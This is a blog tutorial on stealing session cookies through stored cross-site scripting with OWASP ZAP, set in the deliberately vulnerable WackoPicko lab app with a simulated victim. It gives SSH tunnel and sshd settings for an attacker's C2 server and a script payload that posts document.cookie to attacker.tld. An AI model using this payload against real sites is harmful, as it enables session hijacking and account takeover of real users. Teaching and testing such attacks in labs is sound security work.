<!DOCTYPE html>
<html lang="en">

    <head><title>Exploiting Cross-Site Scripting to Steal Cookies with OWASP ZAP &ndash; Chaotic Solutions</title>
<meta name="description" content="A blog about things that can be used, by people.">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="UTF-8"/>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />


<link rel="stylesheet" href="http://kurobeats.github.io/css/palettes/dracula.css">
<link rel="stylesheet" href="http://kurobeats.github.io/css/risotto.css">
<link rel="stylesheet" href="http://kurobeats.github.io/css/custom.css">
</head>

    <body>
        <div class="page">

            <header class="page__header"><nav class="page__nav main-nav">
    <ul>
    <h1 class="page__logo"><a href="http://kurobeats.github.io/" class="page__logo-inner">Chaotic Solutions</a></h1>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://kurobeats.github.io/posts/" title="">Posts</a></li>
    
    </ul>
</nav>

</header>

            <section class="page__body">
    <header class="content__header">
        <h1>Exploiting Cross-Site Scripting to Steal Cookies with OWASP ZAP</h1>
    </header>
    
    <div class="content__body">
        <p>Using cross-site scripting (XSS) to steal cookies is a common method of exploitation as cookies are widely used by web applications for session management. With some XSS vulnerabilities, an attacker can forward the victim&rsquo;s cookies to their own domain, manually insert them into their browser, and assume the victim&rsquo;s identity.</p>
<p>However, there are several limitations to this approach in practice, including the possibility that the victim is not logged in, that cookies are hidden from JavaScript using the HttpOnly flag, that sessions are locked to additional factors such as the user&rsquo;s IP address, and that the session might time out before it can be hijacked.</p>
<p>In this scenario, a simulated victim user views comments on a WackoPicko blog after they are posted, which activates the persistent XSS, causing the user&rsquo;s cookies to be sent to a host controlled by the attacker. The following example leverages OWASP ZAP.</p>
<p><img src="/img/e8bba8fb1f1846b61738e8c2bca29515.png" alt="e8bba8fb1f1846b61738e8c2bca29515.png"></p>
<ul>
<li>Access your remote C2 server via SSH and modify <code>/etc/ssh/sshd_config</code> so the following are enabled:</li>
</ul>
<pre tabindex="0"><code>AllowTcpForwarding yes
GatewayPorts yes
</code></pre><ul>
<li>Restart sshd with systemd:</li>
</ul>
<pre tabindex="0"><code>sudo systemctl restart ssh
</code></pre><ul>
<li>From your attacking machine, create a tunnel via SSH from the remote server so that anything that hits port 38193 will be redirected to the attacker&rsquo;s instance of ZAP</li>
</ul>
<pre tabindex="0"><code>ssh -N -R 38193:localhost:38193 user@attacker.tld
</code></pre><ul>
<li>Going back to ZAP, open the Options menu and go to the go to &ldquo;Callback Address&rdquo; entering the following:</li>
</ul>
<p><img src="/img/c0189e9bd3e534db36df492376038540.png" alt="c0189e9bd3e534db36df492376038540.png"></p>
<ul>
<li>Go back to the Guestbook and submit the following payload in a blog comment, inserting your Test URL:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://attacker.tld:38193/ZapTest&#39;</span>, {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>,
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">body</span><span style="color:#f92672">:</span>document.<span style="color:#a6e22e">cookie</span>
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><ul>
<li>This script will make anyone who views the comment issue a POST request to <code>http://attacker.tld:38193/ZapTest</code> containing their cookie.</li>
<li>Go back to the Callbacks tab (which you may need to add)</li>
</ul>
<p><img src="/img/ba01af62bf03c39585378ce49a4de12b.png" alt="ba01af62bf03c39585378ce49a4de12b.png"></p>
<p>You should see an HTTP interaction. If you don&rsquo;t see any interactions listed, wait a few seconds.</p>
<p><img src="/img/b5f0caabe46fa3b6cacfb7e258bb4c07.png" alt="b5f0caabe46fa3b6cacfb7e258bb4c07.png"></p>
<ul>
<li>Take a note of the value of the victim&rsquo;s cookie in the POST body.</li>
</ul>

    </div>
    <footer class="content__footer"></footer>

            </section>

            <section class="page__aside">
                <div class="aside__about">
<div class="aside__about">
    <img class="about__logo" src="http://kurobeats.github.io/img/favicon.png" alt="Logo">
<h1 class="about__title">Chaotic Solutions</h1>
<p class="about__description">A blog about things that can be used, by people.</p>
</div>


<ul class="aside__social-links">
    
    <li>
        <a href="https://github.com/kurobeats" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="https://discordapp.com/users/218920799967510529" rel="me" aria-label="Discord" title="Discord"><i class="fa-brands fa-discord" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="https://au.linkedin.com/in/acozamanis" rel="me" aria-label="LinkedIn" title="LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
    </li>
    
</ul>
</div>
                <hr>
                <div class="aside__content">
    <p>In this brief piece, you&#39;ll learn about using OWASP ZAP to obtain Cookies through XSS.</p>
    
        <p>
            By Anthony Cozamanis, 
            2023-05-13
        </p>
    

    

                </div>
            </section>

            <footer class="page__footer"><p>
    
    
    
    
    
    
      
    
    
    
</p>
<br /><br />
<p class="copyright">Anthony Cozamanis (CC BY 4.0)</p>
<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
</footer>

        </div>
    </body>

</html>
